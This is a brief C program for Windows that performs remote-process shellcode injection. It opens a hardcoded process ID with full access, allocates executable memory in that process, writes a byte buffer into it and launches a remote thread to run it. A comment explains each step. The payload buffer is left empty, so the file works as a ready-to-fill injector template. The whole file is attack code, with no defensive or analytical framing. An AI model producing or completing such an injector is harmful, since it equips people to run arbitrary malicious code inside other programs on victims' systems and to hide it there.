#include <stdio.h>
#include <windows.h>

/* OpenProcess to get a handle of the remote process
VirtualAllocEx to allocate memory in the remote process
WriteProcessMemory to copy the buffer into the destination
CreateRemoteThread to create a thread in the remote process, which will execute our code
*/

int main() {
	HANDLE hProcess;
	void* addr;
	HANDLE hThread;
	unsigned char buf[] = "";
	hProcess = OpenProcess(PROCESS_ALL_ACCESS, TRUE, 10236);
	addr = VirtualAllocEx(hProcess, NULL, sizeof(buf), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	WriteProcessMemory(hProcess, addr, buf, sizeof(buf), NULL);
	hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)addr, NULL, 0, 0);
	CloseHandle(hProcess);
	return 0;
}
